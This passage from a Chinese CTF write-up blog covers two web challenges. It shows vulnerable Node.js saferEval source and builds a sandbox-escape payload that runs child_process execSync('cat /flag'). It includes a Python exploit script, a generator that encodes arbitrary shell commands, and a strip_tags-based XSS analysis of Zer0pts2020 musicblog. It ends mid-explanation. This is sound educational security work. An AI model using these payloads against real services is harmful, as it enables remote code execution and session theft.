<li>原型链污染</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);	<span class="comment">//引入express模块</span></span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">&#x27;./key.js&#x27;</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用readFileSync(同步读取文件方法)读取index.html</span></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.join(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();	<span class="comment">//实例化一个express</span></span><br><span class="line"><span class="comment">//bodyParser.urlencoded用来解析request中body的urlencoded字符，只支持utf-8的编码的字符,也支持自动的解析gzip和zlib。</span></span><br><span class="line"><span class="comment">//返回的对象是一个键值对，当extended为false的时候，键值对中的值就为&#x27;String&#x27;或&#x27;Array&#x27;形式，为true的时候，则可为任何数据类型。</span></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line"><span class="comment">//将文本解析为JSON</span></span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">&#x27;PHPSESSION&#x27;</span>, <span class="comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">//冻结Object和Math，表明这俩不可被修改</span></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"><span class="comment">//接收POST数据</span></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length===second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>])===md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//unshift()：向数组的开头添加一个或更多元素，并返回新数组的长度。该方法会改变原数组。</span></span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">&#x27;Not verified!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">  	<span class="comment">//pop()：把数组的最后一个元素从其中删除，并返回最后一个元素的值。该方法会改变原数组。</span></span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里有几个概念需要先讲一下</p>
<p><img src="https://img.npfs06.top/20210228230309.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>对于JavaScript中的类型比较：数组<code>[1]==1</code>在两个等于号时候是返回true的，而在三个等于号时候会返回false。这一点是和php一样的。</p>
<p>JavaScript中各个数据类型的相加：node中任何数据类型和字符串相加最后得到的都是字符串</p>
<p>而长度<code>length</code> 属性对于字符串是返回字符串长度，而数组是返回数组元素个数。而数字是没有<code>length</code> 的。</p>
<hr>
<p>我们来看题目，需要绕过两层</p>
<h3 id="hash绕过"><a href="#hash绕过" class="headerlink" title="hash绕过"></a>hash绕过</h3><p>要满足<code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code> 结合上面的结论我们我们想要<code>first</code> 和<code>second</code> 长度一样而他们内容又不相等，但是他们md5加盐后的值又要相等。可以构造如下payload：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;e&quot;</span>:payload,<span class="attr">&quot;first&quot;</span>:[<span class="number">0</span>],<span class="attr">&quot;second&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>这是因为数组利用了<strong>任何数据类型加上字符串都会转变称为字符串的特性</strong>。同时数组和字符串的长度都是1但是他们却不全等。</p>
<h3 id="构造函数执行任意代码"><a href="#构造函数执行任意代码" class="headerlink" title="构造函数执行任意代码"></a>构造函数执行任意代码</h3><p>题目关键代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为可以使用<code>Math.随便什么单词</code>，所以可以获取到<code>Math.__proto__</code>，但这姿势无法直接利用。但是经过尝试，发现<code>Arrow Function</code> 是可以使用的，尝试构造这种链：</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="params">(<span class="built_in">Math</span>)</span>=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.__proto__,<span class="built_in">Math</span>=<span class="built_in">Math</span>.__proto__))(<span class="built_in">Math</span>)</span><br><span class="line"><span class="regexp">//</span> <span class="built_in">Math</span>.__proto__.__proto__</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后尝试调用eval或者Function，但是此处无法直接输入字符串，故使用<code>String.fromCharCode(...)</code>。</p>
<p>然后使用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>+<span class="number">1</span> <span class="comment">// &#x27;[object Math]1&#x27;</span></span><br></pre></td></tr></table></figure>
<p>从原型链上导出String和Function</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">(<span class="params"><span class="built_in">Math</span></span>)=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,<span class="built_in">Math</span>.constructor(<span class="built_in">Math</span>.fromCharCode(...))))(<span class="built_in">Math</span>+<span class="number">1</span>)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">const</span> s = <span class="built_in">Math</span>+<span class="number">1</span>;					<span class="comment">// &#x27;[object Math]1&#x27;</span></span><br><span class="line"><span class="keyword">const</span> a = s.constructor;			<span class="comment">// String</span></span><br><span class="line"><span class="keyword">const</span> e = a.fromCharCode(...);		<span class="comment">// ascii to string</span></span><br><span class="line"><span class="keyword">const</span> f = a.constructor;			<span class="comment">// Function</span></span><br><span class="line">f(e)(); <span class="comment">// 调用</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终要构造的是</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(Math=&gt;(</span><br><span class="line">		Math=<span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>constructor,</span><br><span class="line">		<span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>x=<span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>constructor(</span><br><span class="line">			<span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>from<span class="constructor">CharCode(&#123;<span class="params">encode</span>(<span class="string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)&quot;</span>)</span>&#125;)</span><br><span class="line">		)<span class="literal">()</span></span><br><span class="line">	))(Math+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>Math=&gt;</code> 是什么意思？我们来看个简单的例子：</p>
<p><img src="https://img.npfs06.top/20210228231505.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><code>x =&gt; x * x</code> 相当于：</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title"></span>(x) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">x</span> * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>同理<code>a = x=&gt;x*x</code> 相当于命名了一个名字为a的函数</p>
<p>那么<code>(x=&gt;x+x)(2)</code>呢其实就相当于往这个函数里面传入参数2</p>
<p>我们再回到payload本身<code>(Math=Math.constructor,Math.x=Math.constructor(......))</code> 可以清楚地看到最外层括号是一个逗号运算，而逗号运算我们知道是从左往右运算再最后返回最右边的值。我们由此得知这里是执行这么个运算：</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Math.<span class="built_in">constructor</span>.<span class="built_in">constructor</span>(.....)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>而这又是什么呢，我们直接逐层测试的<code>Math.constructor</code> ：</p>
<p><img src="https://img.npfs06.top/20210228231658.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以见到第一层返回的<code>function object()</code>,他是function的对象原型，而我们知道Object的构造器是指向Function的所以第二层会出现Function。而Function是构造函数他能够创建函数。可以简单理解他和eval类似。我们可以测试一个例子：</p>
<p><img src="https://img.npfs06.top/20210228231839.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以直接看到结果，<code>Math.constructor.constructor()</code> 和构造函数<code>new Function()</code> 是等效的</p>
<p>而payload的最里面<code>fromCharCode</code>就很容易理解了就是把AIISC码转换为字符串,</p>
<p>一切都理解了，最终的payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://df4685cc-7ff5-4912-9821-beb74887feee.node3.buuoj.cn/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;e&quot;</span>:<span class="string">&#x27;(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&#x27;</span>,<span class="string">&quot;first&quot;</span>:[<span class="number">0</span>],<span class="string">&quot;second&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<p>ascii生成脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">cmd</span>):</span></span><br><span class="line">  s = <span class="string">f&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;).toString()&quot;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;,&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">ord</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">print(gen(<span class="string">&quot;ls&quot;</span>))</span><br></pre></td></tr></table></figure>


<h2 id="Zer0pts2020-musicblog"><a href="#Zer0pts2020-musicblog" class="headerlink" title="[Zer0pts2020]musicblog"></a>[Zer0pts2020]musicblog</h2><p>知识点：</p>
<ol>
<li>代码审计</li>
<li>strip_tags()安全问题</li>
<li>xss</li>
</ol>
<p>打开环境是一个Blog。在发布文章时可以选择是否公开，如果设置为公开，admin用户会自动访问该文章并点赞。写文章时可以使用<code>[[URL]]</code>语法，将其插入到句子中会展开成<code>&lt;audio controls src=&quot;URL&quot;&gt;&lt;/audio&gt;</code>这样的audio元素。</p>
<p>buu上没有给源码，自己去Gitlab上下来一个，审计</p>
<p>首先是bot代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//worker/worker.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">&#x27;zer0pts&#123;M4sh1m4fr3sh!!&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> browser_option = &#123;</span><br><span class="line">    executablePath: <span class="string">&#x27;google-chrome-unstable&#x27;</span>,</span><br><span class="line">    headless: <span class="literal">true</span>,</span><br><span class="line">    args: [</span><br><span class="line">        <span class="string">&#x27;--no-sandbox&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-background-networking&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-default-apps&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-extensions&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-gpu&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-sync&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-translate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--hide-scrollbars&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--metrics-recording-only&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--mute-audio&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--no-first-run&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--safebrowsing-disable-auto-update&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> browser = <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">&#x27;networkidle0&#x27;</span>,</span><br><span class="line">            timeout: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        page.click(<span class="string">&#x27;#like&#x27;</span>);</span><br><span class="line">        <span class="keyword">await</span> page.waitForNavigation(&#123;<span class="attr">timeout</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到bot将flag设为UA然后去点击<code>#like</code>标签</p>
<p>接下来审一下题目web程序的源码，首先在init.php可以看到有CSP：</p>
<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Security-Policy: <span class="keyword">default-src</span> <span class="string">&#x27;self&#x27;</span>; <span class="keyword">object-src</span> <span class="string">&#x27;none&#x27;</span>; <span class="keyword">script-src</span> <span class="string">&#x27;nonce-$&#123;nonce&#125;&#x27;</span> <span class="string">&#x27;strict-dynamic&#x27;</span>; <span class="keyword">base-uri</span> <span class="string">&#x27;none&#x27;</span>; trusted-types&quot;);</span><br><span class="line">header(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-XSS-Protection: 1; mode=block&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>题目是一个博客，发表的文章会被后台管理员的Bot检查，加上CSP，基本可以断定是个xss的题。</p>
<p><img src="https://img.npfs06.top/20210301213104.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>在查看文章的post.php代码中 ,发现在输出内容时调用了自定义的<code>render_tags()</code>函数，我们全局搜索该函数，跟进到util.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//util.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// [[URL]] → &lt;audio src=&quot;URL&quot;&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$str</span> = preg_replace(<span class="string">&#x27;/\[\[(.+?)\]\]/&#x27;</span>, <span class="string">&#x27;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  <span class="variable">$str</span> = strip_tags(<span class="variable">$str</span>, <span class="string">&#x27;&lt;audio&gt;&#x27;</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们提交的[[URL]]被替换成<code>&lt;audio&gt;</code>标签就是在<code>render_tags()</code>中进行的，这里有个<code>strip_tags</code>函数，该函数的作用是除去所有非<code>&lt;audio&gt;</code>标签,比如说我们传入</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[npfs&quot;&gt;<span class="tag">&lt;/<span class="name">audio</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;a&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;]]</span><br></pre></td></tr></table></figure>
<p>在<code>render_tags()</code>中经<code>render_tags()</code>中作用后变成</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span> <span class="attr">src</span>=<span class="string">&quot;npfs&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;a&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&quot;&gt;<span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果不存在<code>strip_tags()</code>，这里可以利用<code>&lt;script&gt;</code>从<code>&lt;audio&gt;</code>标签中逃逸出来实现xss，但是经过<code>strip_tags()</code>的剥去html标签处理后，字符串变成了：</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;audio controls src=&quot;npfs&quot;&gt;</span><span class="params">&lt;/audio&gt;</span>alert(<span class="string">&#x27;a&#x27;</span>);<span class="string">&quot;&quot;</span>&gt;<span class="params">&lt;/audio&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里alert(‘a’)前面的没有被去除掉是因为html标签成对出现，因此<code>strip_tags()</code>的处理也自动对白名单标签的闭合标签做了白名单处理，也就是说在白名单中，不会被剔除掉</p>
<p><strong>这里就要说到<code>strip_tags()</code>函数的安全问题了，它允许标签里出现斜线，猜测这是为了匹配闭合标签的。但是没有判断斜线的位置，在哪出现都可以</strong></p>
